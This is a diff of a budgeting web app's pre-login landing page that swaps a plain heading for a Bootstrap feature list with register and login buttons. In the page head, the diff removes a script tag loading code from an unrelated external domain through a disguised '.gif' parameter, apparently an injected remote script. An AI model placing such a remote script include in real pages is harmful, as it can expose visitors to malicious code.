@@ -5,12 +5,40 @@
 
 
 <head>
-    <script type="text/javascript" src="http://404bajery.pl/fall/script.php?id=money/Money6.gif&how=false"></script>
+   
+    <style>
+        .cosUL {
+            list-style: none;
+        }
+
+            .cosUL li:before {
+                content: '✓    ';
+            }
+    </style>
 </head>
 
-<div style="position: relative; top: 70px; display: flex;flex-direction:column; align-items: center">
-    <h1 style="color:black; font-family: 'Ubuntu'">Welcome on home page before login</h1>
-    <img style="width:50%" src="https://images.actionnetwork.com/800x450/blog/2018/02/burningmoney_180213.jpg" alt="Alternate Text" />
+<div class="jumbotron" style="position: relative; top:220px;background: rgba(90, 166, 130, 0.9); border: 0.5px solid black;">
+    <h1 class="display-4">Welcome on BudgetApp page</h1>
+    <p class="lead">It's pleasure to have you here. Soo... What's that app exactly? We are giving you opportunity to save money. That's the best way you have.  </p>
+    <p class="lead">Main features: </p>
+    <hr class="">
+    <ul class="cosUL">
+        <li> Intuitive, simple, fast, clean</li>
+        <li> Reminders for recurring bills and deposits</li>
+        <li> Cool tips teching how to save money</li>
+        <li> Budgeting and cash flow forecasting</li>
+       
+    </ul>
+    <div style="position:relative; width:100%; left:34%">
+        <div style="display:flex; flex-direction:row; width:30%; justify-content:space-around; ">
+            <p class="lead">
+                <a class="btn btn-primary btn-lg" href="http://localhost:57502/Account/Register" role="button">Join us!</a>
+            </p>
+            <p class="lead">
+                <a class="btn btn-primary btn-lg" href="http://localhost:57502/Account/Login" role="button">Log in</a>
 
+            </p>
+        </div>
+    </div>
 </div>
 
